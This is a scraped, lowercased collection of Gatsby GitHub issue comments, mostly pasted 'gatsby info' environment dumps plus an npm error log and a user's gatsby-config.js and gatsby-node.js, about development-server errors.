- /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 83.0.4103.116 firefox: 76.0.1 safari: 12.1.1 npmpackages: gatsby: ^2.22.0 => 2.22.0 gatsby-awesome-pagination: ^0.3.6 => 0.3.6 gatsby-image: ^2.4.7 => 2.4.7 gatsby-plugin-lodash: ^3.3.1 => 3.3.1 gatsby-plugin-netlify: ^2.3.2 => 2.3.2 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-purgecss: ^4.0.1 => 4.0.1 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-remote-images: ^2.1.0 => 2.1.0 gatsby-plugin-sass: ^2.3.1 => 2.3.1 gatsby-plugin-sharp: ^2.6.6 => 2.6.6 gatsby-remark-images: ^3.3.5 => 3.3.5 gatsby-source-filesystem: ^2.3.5 => 2.3.5 gatsby-source-wordpress: ^3.3.5 => 3.3.5 gatsby-transformer-remark: ^2.8.10 => 2.8.10 gatsby-transformer-sharp: ^2.5.2 => 2.5.2 gatsby-wordpress-reading-time: ^1.0.4 => 1.0.4 npmglobalpackages: gatsby-cli: 2.8.29
wsl2 on windows 10
note that i am using this service becuase of the recommendation on the gatsby windows page system: os: linux 4.19 ubuntu 20.04 lts (focal fossa) cpu: (4) x64 intel(r) core(tm) i5-3570 cpu @ 3.40ghz shell: 5.0.16 - /bin/bash binaries: node: 12.18.2 - ~/.nvm/versions/node/v12.18.2/bin/node yarn: 1.22.4 - ~/.nvm/versions/node/v12.18.2/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v12.18.2/bin/npm npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-offline: ^3.2.13 => 3.2.13 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-sharp: ^2.6.14 => 2.6.14 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-transformer-sharp: ^2.5.7 => 2.5.7 npmglobalpackages: gatsby-cli: 2.12.56 i have read other issues but just becuase this is a cors issue does not mean this is not a gatsby issue
if booting up a gatsby local development server causes all these errors, then it's a problem caused by gatsby
(probably socket.io) especially, if i'm developing on an environment the gatsby team has recommended
**especially** if starting up other react related frameworks like nextjs or cra doesn't cause these errors
my guess is that since the wsl can interfere with web sockets, it's probably a conflict, but i have no idea
which is why shutting issues without examining them is probably not a good idea.
``` system: os: linux 5.4 ubuntu 20.04 lts (focal fossa) cpu: (12) x64 intel(r) core(tm) i7-10750h cpu @ 2.60ghz shell: 5.0.16 - /bin/bash binaries: node: 10.19.0 - /usr/bin/node npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.18 - /usr/bin/python browsers: chrome: 83.0.4103.97 firefox: 77.0.1 npmpackages: gatsby: ^2.19.12 => 2.23.21 gatsby-image: ^2.2.40 => 2.4.12 gatsby-plugin-catch-links: ^2.1.25 => 2.3.10 gatsby-plugin-create-client-paths: ^2.2.1 => 2.3.9 gatsby-plugin-feed: ^2.3.27 => 2.5.10 gatsby-plugin-google-analytics: ^2.1.35 => 2.3.10 gatsby-plugin-lodash: ^3.1.20 => 3.3.9 gatsby-plugin-manifest: ^2.2.41 => 2.4.17 gatsby-plugin-material-ui: ^2.1.6 => 2.1.9 gatsby-plugin-netlify-cms: ^4.1.38 => 4.3.10 gatsby-plugin-nprogress: ^2.1.19 => 2.3.9 gatsby-plugin-offline: ^3.0.34 => 3.2.16 gatsby-plugin-react-helmet: ^3.1.22 => 3.3.9 gatsby-plugin-sass: ^2.2.1 => 2.3.10 gatsby-plugin-sharp: ^2.4.5 => 2.6.18 gatsby-plugin-sitemap: ^2.2.27 => 2.4.10 gatsby-plugin-twitter: ^2.1.19 => 2.3.9 gatsby-plugin-typescript: ^2.3.1 => 2.4.13 gatsby-remark-autolink-headers: ^2.1.24 => 2.3.10 gatsby-remark-copy-linked-files: ^2.1.37 => 2.3.10 gatsby-remark-images: ^3.1.44 => 3.3.17 gatsby-remark-prismjs: ^3.3.31 => 3.5.9 gatsby-remark-relative-images: ^0.2.3 => 0.2.3 gatsby-remark-responsive-iframe: ^2.2.32 => 2.4.10 gatsby-source-filesystem: ^2.1.48 => 2.3.18 gatsby-transformer-remark: ^2.6.50 => 2.8.23 gatsby-transformer-sharp: ^2.3.14 => 2.5.10 npmglobalpackages: gatsby-cli: 2.12.58
``` npm log ```
0 info it worked if it ends with ok
1 verbose cli [ '/usr/bin/node', '/usr/local/bin/npm', 'run', 'dev' ]
2 info using npm@6.14.5
3 info using node@v10.19.0
4 verbose run-script [ 'predev', 'dev', 'postdev' ]
5 info lifecycle elearning-platform-app@1.1.0~predev: elearning-platform-app@1.1.0
6 info lifecycle elearning-platform-app@1.1.0~dev: elearning-platform-app@1.1.0
7 verbose lifecycle elearning-platform-app@1.1.0~dev: unsafe-perm in lifecycle true
8 verbose lifecycle elearning-platform-app@1.1.0~dev: path: /usr/local/lib/node_modules/npm/node_modules/npm-lifecycle/node-gyp-bin:/home/dipper/workspace/video_front_end/node_modules/.bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
9 verbose lifecycle elearning-platform-app@1.1.0~dev: cwd: /home/dipper/workspace/video_front_end
10 silly lifecycle elearning-platform-app@1.1.0~dev: args: [ '-c', 'npm run develop' ]
11 silly lifecycle elearning-platform-app@1.1.0~dev: returned: code: 1 signal: null
12 info lifecycle elearning-platform-app@1.1.0~dev: failed to exec dev script
13 verbose stack error: elearning-platform-app@1.1.0 dev: `npm run develop`
13 verbose stack exit status 1
13 verbose stack at eventemitter.<anonymous> (/usr/local/lib/node_modules/npm/node_modules/npm-lifecycle/index.js:332:16)
13 verbose stack at eventemitter.emit (events.js:198:13)
13 verbose stack at childprocess.<anonymous> (/usr/local/lib/node_modules/npm/node_modules/npm-lifecycle/lib/spawn.js:55:14)
13 verbose stack at childprocess.emit (events.js:198:13)
13 verbose stack at maybeclose (internal/child_process.js:982:16)
13 verbose stack at process.childprocess._handle.onexit (internal/child_process.js:259:5)
14 verbose pkgid elearning-platform-app@1.1.0
15 verbose cwd /home/dipper/workspace/video_front_end
16 verbose linux 5.4.0-39-generic
17 verbose argv "/usr/bin/node" "/usr/local/bin/npm" "run" "dev"
18 verbose node v10.19.0
19 verbose npm v6.14.5
20 error code elifecycle
21 error errno 1
22 error elearning-platform-app@1.1.0 dev: `npm run develop`
22 error exit status 1
23 error failed at the elearning-platform-app@1.1.0 dev script.
23 error this is probably not a problem with npm
there is likely additional logging output above.
24 verbose exit [ 1, true ] ```
$ gatsby info --clipboard system: os: windows 10 10.0.18362 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz binaries: node: 12.18.2 - c:\\program files\ odejs\ ode.exe yarn: 1.16.0 - d:\\yarn\\bin\\yarn.cmd npm: 6.14.5 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-plugin-emotion: ^4.3.9 => 4.3.9 gatsby-plugin-typography: ^2.5.9 => 2.5.9 npmglobalpackages: gatsby-cli: 2.12.52
system: os: macos mojave 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-4258u cpu @ 2.40ghz shell: 3.2.57 - /bin/bash binaries: node: 12.1.0 - /usr/local/bin/node yarn: 1.15.2 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 firefox: 76.0.1 safari: 13.1.1 npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-offline: ^3.2.13 => 3.2.13 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-sharp: ^2.6.14 => 2.6.14 gatsby-remark-autolink-headers: ^2.3.10 => 2.3.10 gatsby-remark-embed-video: ^3.0.10 => 3.0.10 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-source-git: ^1.1.0 => 1.1.0 gatsby-transformer-remark: ^2.8.23 => 2.8.23 gatsby-transformer-sharp: ^2.5.7 => 2.5.7 npmglobalpackages: gatsby-cli: 2.12.40 gatsby: 2.8.8
``` system: os: linux 4.19 ubuntu 18.04.2 lts (bionic beaver) cpu: (8) x64 intel(r) core(tm) i7-8565u cpu @ 1.80ghz shell: 5.4.2 - /usr/bin/zsh binaries: node: 14.4.0 - /usr/local/bin/node yarn: 1.22.4 - /c/program files (x86)/yarn/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.17 - /usr/bin/python npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-offline: ^3.2.13 => 3.2.13 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-sharp: ^2.6.18 => 2.6.18 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-transformer-sharp: ^2.5.10 => 2.5.10
npm version: 6.14.5
node version: 14.5.0 (tried on 12 as well)
gatsby version: 2.21.36
system: os: windows 10 10.0.18362 cpu: (12) x64 intel(r) core(tm) i7-8700k cpu @ 3.70ghz binaries: node: 13.11.0 - c:\\program files\ odejs\ ode.exe npm: 6.13.7 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.2 - /c/python38/python browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.22.15 => 2.22.15 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-theme-material-ui: ^1.0.10 => 1.0.10 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.12.45
``` system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.17.0 - ~/.nvm/versions/node/v12.17.0/bin/node npm: 6.14.5 - ~/.nvm/versions/node/v12.17.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 safari: 13.1.1 npmpackages: gatsby: ^2.23.20 => 2.23.20 gatsby-image: ^2.4.12 => 2.4.12 gatsby-plugin-mdx: ^1.2.22 => 1.2.22 gatsby-plugin-preact: ^4.0.8 => 4.0.8 gatsby-plugin-react-helmet: ^3.3.9 => 3.3.9 gatsby-plugin-styled-components: ^3.3.9 => 3.3.9 gatsby-source-filesystem: ^2.3.18 => 2.3.18 npmglobalpackages: gatsby-cli: 2.12.58
``` system: os: macos high sierra 10.13.6 cpu: (4) x64 intel(r) core(tm) i5-2500s cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 12.18.1 - ~/.nvm/versions/node/v12.18.1/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v12.18.1/bin/npm languages: python: 3.7.6 - /users/acidjunk/opt/anaconda3/bin/python browsers: chrome: 83.0.4103.116 firefox: 73.0.1 safari: 13.1.1 npmpackages: gatsby: 2.22.20 => 2.22.20 gatsby-plugin-manifest: ^2.4.12 => 2.4.17 gatsby-plugin-mdx: ^1.2.18 => 1.2.22 gatsby-plugin-offline: ^3.2.11 => 3.2.16 gatsby-plugin-react-helmet: 3.3.3 => 3.3.3 gatsby-plugin-remove-serviceworker: 1.0.0 => 1.0.0 gatsby-plugin-sharp: ^2.6.12 => 2.6.17 gatsby-plugin-stylus: 2.3.3 => 2.3.3 gatsby-remark-images: ^3.3.11 => 3.3.17 gatsby-source-apiserver: ^2.1.6 => 2.1.6 gatsby-source-filesystem: 2.3.10 => 2.3.10 gatsby-transformer-remark: 2.8.14 => 2.8.14 gatsby-transformer-sharp: ^2.5.5 => 2.5.10 npmglobalpackages: gatsby: 2.23.4
``` a public repo can be found here:
``` system: os: windows 10 10.0.18363 cpu: (16) x64 amd ryzen 7 2700x eight-core processor binaries: node: 12.18.1 - c:\\program files\ odejs\ ode.exe npm: 6.14.5 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-offline: ^3.2.13 => 3.2.13 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-sharp: ^2.6.14 => 2.6.14 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-transformer-sharp: ^2.5.7 => 2.5.7 npmglobalpackages: gatsby-cli: 2.12.58
(if relevant) <!-- required
run `gatsby info --clipboard` in your gatsby project directory and paste its contents here.
--> ### file contents (if changed) `gatsby-config.js`: ```
require("dotenv").config({ path: `.env.${process.env.node_env}`,
}) module.exports = { sitemetadata: {
}, plugins: [ { resolve: "gatsby-source-google-spreadsheet", options: { spreadsheetid: "xyzxyz", spreadsheetname: "mysheet", typeprefix: "googlespreadsheet", credentials: require(\'./xyzxyz.json\'), filternode: () => true, mapnode: node => node } }, { resolve: `gatsby-plugin-prefetch-google-fonts`, options: { fonts: [ { family: `roboto`, variants: [`300`,`400`,`700`,`700i`], }, { family: `krona one`, variants: [`400`], }, ], }, }, { resolve: `gatsby-source-filesystem`, options: { name: `markdown-pages`, path: `${__dirname}/src/mdpages`, }, }, { resolve: `gatsby-source-filesystem`, options: { name: `startupsimage`, path: `${__dirname}/src/images/startups/image/`, }, }, `gatsby-transformer-remark`, `gatsby-transformer-sharp`, `gatsby-plugin-sharp`, { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/src/images/`, }, }, `gatsby-plugin-modal-routing`, ],
``` `gatsby-node.js`: ```
// implement the gatsby api ncreatepage
// called after every page is created.
exports.oncreatepage = async ({ page, actions }) => { const { createpage } = actions // page.matchpath is a special key that's used for matching pages // only on the client
if (page.path.match(/^\\/app/)) { page.matchpath = "/app/*" // update the page
createpage(page) }
exports.createpages = async ({ actions, graphql, reporter }) => { const { createpage } = actions // blog posts const blogposttemplate = require.resolve(`./src/templates/blog.js`) const result = await graphql(` { allmarkdownremark( sort: { order: desc, fields: [frontmatter___date] } limit: 1000 ) { edges { node { frontmatter { slug } } } } } `) // handle errors if (result.errors) { reporter.paniconbuild(`error while running graphql query.`) return } result.data.allmarkdownremark.edges.foreach(({ node }) => { createpage({ path: node.frontmatter.slug, component: blogposttemplate, context: { // additional data can be passed via context slug: node.frontmatter.slug, }, }) }) // startups const returnedstartups = await graphql(` query myquery { allgooglespreadsheetmysheetstartups { edges { previous { coid cotitle } next { coid cotitle } node { coid codate cotitle cologo coimage cowebsite colinkedin cotwitter coyrfounded colocation conatsol comaritime codigital cophysical cooneliner co100words cotechnologies coapplications cocategories cosection coachievements copress cointerview cointdate cointnotes colevel covisibility coweight } } } } ` ) if (returnedstartups.errors) { throw returnedstartups.errors } const startups = returnedstartups.data.allgooglespreadsheetmysheetstartups.edges startups.foreach((startup, index) => { console.log(`${startup.node.coid} created`); createpage({ path: `/startups/${startup.node.coid}`, component: require.resolve("./src/components/startuppage.js"), context: { id : startup.node.coid, data: startup.node, prev: startup.previous, next: startup.next, image: `../images/startups/logo/${startup.node.coid}.png` }, }) }) createpage({ path: `/startups`, component: require.resolve("./src/templates/startupslist.js"), context: { data: startups, }, })
```
`gatsby-ssr.js`: n/a
system: os: windows 10 10.0.18363 cpu: (2) x64 intel(r) core(tm)2 duo cpu e8500 @ 3.16ghz binaries: node: 14.3.0 - c:\\program files\ odejs\ ode.exe yarn: 1.22.4 - ~\\appdata\ oaming\ pm\\yarn.cmd npm: 6.14.5 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.3 browsers: edge: 44.18362.449.0 npmglobalpackages: gatsby-cli: 2.12.52 also terminal app is microsoft terminal installed from windows app store.
system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.4.0 - /var/folders/tp/g7hx5p9s3tg4kpqhf66zcxvn_swy3m/t/yarn--1593758726969-0.017458157550566344/node yarn: 1.22.4 - /var/folders/tp/g7hx5p9s3tg4kpqhf66zcxvn_swy3m/t/yarn--1593758726969-0.017458157550566344/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 firefox: 77.0.1 safari: 13.1 npmpackages: gatsby: 2.23.17 => 2.23.17 gatsby-cli: 2.12.55 => 2.12.55 gatsby-image: 2.4.7 => 2.4.7 gatsby-link: 2.4.11 => 2.4.11 gatsby-plugin-google-tagmanager: 2.3.5 => 2.3.5 gatsby-plugin-manifest: 2.4.12 => 2.4.12 gatsby-plugin-material-ui: 2.1.9 => 2.1.9 gatsby-plugin-mdx: 1.2.15 => 1.2.15 gatsby-plugin-offline: 3.2.16 => 3.2.16 gatsby-plugin-react-helmet: 3.3.6 => 3.3.6 gatsby-plugin-sass: 2.3.4 => 2.3.4 gatsby-plugin-sharp: 2.6.10 => 2.6.10 gatsby-plugin-sitemap: 2.4.4 => 2.4.4 gatsby-plugin-styled-components: 3.3.4 => 3.3.4 gatsby-react-router-scroll: 3.0.10 => 3.0.10 gatsby-remark-autolink-headers: 2.3.4 => 2.3.4 gatsby-remark-copy-linked-files: 2.3.3 => 2.3.3 gatsby-remark-embed-snippet: 4.3.7 => 4.3.7 gatsby-remark-images: 3.3.13 => 3.3.13 gatsby-remark-prismjs: 3.5.4 => 3.5.4 gatsby-source-filesystem: 2.3.11 => 2.3.11 gatsby-transformer-json: 2.4.7 => 2.4.7 gatsby-transformer-remark: 2.8.17 => 2.8.17 gatsby-transformer-sharp: 2.5.5 => 2.5.5
system: os: linux 4.4 alpine linux cpu: (4) x64 intel(r) xeon(r) platinum 8259cl cpu @ 2.50ghz shell: 1.30.1 - /bin/ash binaries: node: 13.11.0 - /usr/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.2 - /usr/bin/npm languages: python: 2.7.18 - /usr/bin/python npmglobalpackages: gatsby-cli: 2.12.56
system: os: macos 10.15.3 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.3.0 - ~/.nvm/versions/node/v14.3.0/bin/node npm: 6.14.5 - ~/.nvm/versions/node/v14.3.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 safari: 13.0.5 npmglobalpackages: gatsby-cli: 2.12.45
system: os: windows 10 10.0.18362 cpu: (4) x64 intel(r) core(tm) i5-7200u cpu @ 2.50ghz binaries: node: 12.16.0 - c:\\program files\ odejs\ ode.exe npm: 6.13.4 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 - c:\\python27\\python.exe browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.23.14 => 2.23.14 gatsby-background-image: ^0.7.6 => 0.7.6 gatsby-cli: ^2.12.54 => 2.12.54 gatsby-image: ^2.4.11 => 2.4.11 gatsby-plugin-advanced-sitemap: ^1.5.5 => 1.5.5 gatsby-plugin-manifest: ^2.4.16 => 2.4.16 gatsby-plugin-offline: ^2.2.10 => 2.2.10 gatsby-plugin-react-helmet: ^3.3.8 => 3.3.8 gatsby-plugin-sharp: ^2.6.16 => 2.6.16 gatsby-source-filesystem: ^2.0.37 => 2.3.16 gatsby-source-wordpress: ^3.3.17 => 3.3.17 gatsby-transformer-sharp: ^2.5.9 => 2.5.9 thanks a lot!!
system: os: macos 10.15.5 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.18.2 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 firefox: 77.0.1 safari: 13.1.1
system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.16 - /usr/bin/python npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-feed: ^2.5.7 => 2.5.7 gatsby-plugin-google-analytics: ^2.3.6 => 2.3.6 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-offline: ^3.2.13 => 3.2.13 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-sharp: ^2.6.14 => 2.6.14 gatsby-plugin-typography: ^2.5.6 => 2.5.6 gatsby-remark-copy-linked-files: ^2.3.7 => 2.3.7 gatsby-remark-images: ^3.3.14 => 3.3.14 gatsby-remark-prismjs: ^3.5.6 => 3.5.6 gatsby-remark-responsive-iframe: ^2.4.7 => 2.4.7 gatsby-remark-smartypants: ^2.3.6 => 2.3.6 gatsby-source-contentful: ^2.3.18 => 2.3.18 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-transformer-remark: ^2.8.20 => 2.8.20 gatsby-transformer-sharp: ^2.5.7 => 2.5.7 npmglobalpackages: gatsby-cli: 2.12.52
system: os: linux 5.7 arch linux cpu: (12) x64 intel(r) xeon(r) e-2176m cpu @ 2.70ghz shell: 5.0.17 - /bin/bash binaries: node: 14.4.0 - /sbin/node yarn: 1.22.4 - /sbin/yarn npm: 6.14.5 - /sbin/npm languages: python: 3.8.3 - /sbin/python browsers: firefox: 77.0.1 npmpackages: gatsby: ^2.23.3 => 2.23.3 gatsby-image: ^2.4.7 => 2.4.7 gatsby-plugin-manifest: ^2.4.11 => 2.4.11 gatsby-plugin-offline: ^3.2.9 => 3.2.9 gatsby-plugin-react-helmet: ^3.3.4 => 3.3.4 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-sass: ^2.3.5 => 2.3.5 gatsby-plugin-sharp: ^2.6.11 => 2.6.11 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-source-filesystem: ^2.3.11 => 2.3.11 gatsby-transformer-sharp: ^2.5.5 => 2.5.5
system: os: windows 10 10.0.18362 cpu: (8) x64 amd ryzen 5 3550h with radeon vega mobile gfx binaries: node: 12.18.1 - c:\\program files\ odejs\ ode.exe npm: 6.14.5 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.21.0 => 2.21.0 gatsby-image: ^2.4.0 => 2.4.0 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-sharp: ^2.6.0 => 2.6.0 gatsby-plugin-sitemap: ^2.4.2 => 2.4.2 gatsby-source-filesystem: ^2.3.0 => 2.3.0 gatsby-source-strapi: 0.0.12 => 0.0.12 gatsby-transformer-sharp: ^2.5.0 => 2.5.0 npmglobalpackages: gatsby-cli: 2.12.51
system: os: windows 10 10.0.19041 cpu: (4) x64 intel(r) core(tm) i5-4460 cpu @ 3.20ghz binaries: node: 12.16.3 - c:\\program files\ odejs\ ode.exe yarn: 1.22.4 - ~\\appdata\ oaming\ pm\\yarn.cmd npm: 6.14.5 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.2 - /c/python38/python browsers: edge: 44.19041.1.0 npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-cli: ^2.12.51 => 2.12.51 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-google-tagmanager: ^2.3.7 => 2.3.7 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-sharp: ^2.6.14 => 2.6.14 gatsby-plugin-sitemap: ^2.4.7 => 2.4.7 gatsby-plugin-styled-components: ^3.3.6 => 3.3.6 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-transformer-sharp: ^2.5.7 => 2.5.7 npmglobalpackages: gatsby: 2.21.10
system: os: windows 10 10.0.18363 cpu: (8) x64 intel(r) core(tm) i7-8650u cpu @ 1.90ghz binaries: node: 12.14.1 - c:\\program files\ odejs\ ode.exe npm: 6.13.6 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.0.76 => 2.21.22 gatsby-background-image: ^0.9.19 => 0.9.19 gatsby-image: ^2.0.20 => 2.4.3 gatsby-plugin-catch-links: ^2.3.2 => 2.3.2 gatsby-plugin-html-attributes: ^1.0.5 => 1.0.5 gatsby-plugin-manifest: ^2.0.9 => 2.4.2 gatsby-plugin-netlify: ^2.3.7 => 2.3.5 gatsby-plugin-netlify-cms: ^4.3.1 => 4.3.1 gatsby-plugin-offline: ^2.0.16 => 2.2.10 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.0.2 => 3.3.1 gatsby-plugin-recaptcha: ^1.0.5 => 1.0.5 gatsby-plugin-sharp: ^2.0.14 => 2.6.2 gatsby-plugin-sitemap: ^2.4.4 => 2.4.4 gatsby-plugin-svgr: ^2.0.1 => 2.0.2 gatsby-remark-images: ^3.3.3 => 3.3.3 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-source-contentful: ^2.3.7 => 2.3.7 gatsby-source-filesystem: ^2.0.8 => 2.3.1 gatsby-transformer-remark: ^2.8.7 => 2.8.7 gatsby-transformer-sharp: ^2.1.8 => 2.5.2 npmglobalpackages: gatsby-cli: 2.12.24 thanks in advance!
system: os: windows 10 10.0.18362 cpu: (4) x64 intel(r) core(tm) i7-6500u cpu @ 2.50ghz binaries: node: 12.16.1 - c:\\program files\ odejs\ ode.exe yarn: 1.22.4 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.14.0 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.16 - /c/users/pramo/.windows-build-tools/python27/python browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.0.19 => 2.23.11 gatsby-source-graphql: ^2.0.6 => 2.5.7 npmglobalpackages: gatsby-cli: 2.12.50
system: os: linux 5.3 ubuntu 18.04.4 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i5-3330s cpu @ 2.70ghz shell: 4.4.20 - /bin/bash binaries: node: 12.18.1 - ~/.nvm/versions/node/v12.18.1/bin/node npm: 6.14.5 - ~/.nvm/versions/node/v12.18.1/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 81.0.4044.129 firefox: 77.0.1 npmpackages: gatsby: ^2.23.10 => 2.23.10 gatsby-image: ^2.4.8 => 2.4.8 gatsby-plugin-manifest: ^2.4.13 => 2.4.13 gatsby-plugin-offline: ^3.2.12 => 3.2.12 gatsby-plugin-react-helmet: ^3.3.5 => 3.3.5 gatsby-plugin-sharp: ^2.6.13 => 2.6.13 gatsby-source-filesystem: ^2.3.13 => 2.3.13 gatsby-transformer-sharp: ^2.5.6 => 2.5.6 npmglobalpackages: gatsby-cli: 2.12.51
system: os: macos mojave 10.14.6 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/sh binaries: node: 12.16.3 - ~/.nvm/versions/node/v12.16.3/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.16.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 83.0.4103.116 firefox: 77.0.1 safari: 13.1.1 npmpackages: gatsby: 2.23.11 => 2.23.1 gatsby-cli: ^2.12.44 => 2.12.44 gatsby-image: ^2.4.7 => 2.4.7 gatsby-link: ^2.4.6 => 2.4.6 gatsby-plugin-catch-links: ^2.3.5 => 2.3.5 gatsby-plugin-favicon: ^3.1.6 => 3.1.6 gatsby-plugin-google-tagmanager: ^2.3.5 => 2.3.5 gatsby-plugin-manifest: ^2.4.11 => 2.4.11 gatsby-plugin-netlify-cms: ^4.3.5 => 4.3.5 gatsby-plugin-node-fields: 3.1.0 => 3.1.0 gatsby-plugin-page-creator: ^2.3.9 => 2.3.9 gatsby-plugin-react-helmet: ^3.3.4 => 3.3.4 gatsby-plugin-react-helmet-canonical-urls: ^1.4.0 => 1.4.0 gatsby-plugin-scroll-reveal: ^0.0.7 => 0.0.7 gatsby-plugin-sharp: ^2.6.11 => 2.6.11 gatsby-plugin-sitemap: ^2.4.5 => 2.4.5 gatsby-plugin-styled-components: ^3.3.4 => 3.3.4 gatsby-plugin-svgr: ^2.0.2 => 2.0.2 gatsby-react-router-scroll: 3.0.3 => 3.0.3 gatsby-remark-autolink-headers: ^2.3.5 => 2.3.5 gatsby-remark-component-parent2div: ^1.2.3 => 1.2.3 gatsby-remark-copy-linked-files: ^2.3.5 => 2.3.5 gatsby-remark-footnotes: ^0.0.7 => 0.0.7 gatsby-remark-images: ^3.3.10 => 3.3.10 gatsby-remark-numbered-footnotes: ^1.0.1 => 1.0.1 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-remark-responsive-iframe: ^2.4.5 => 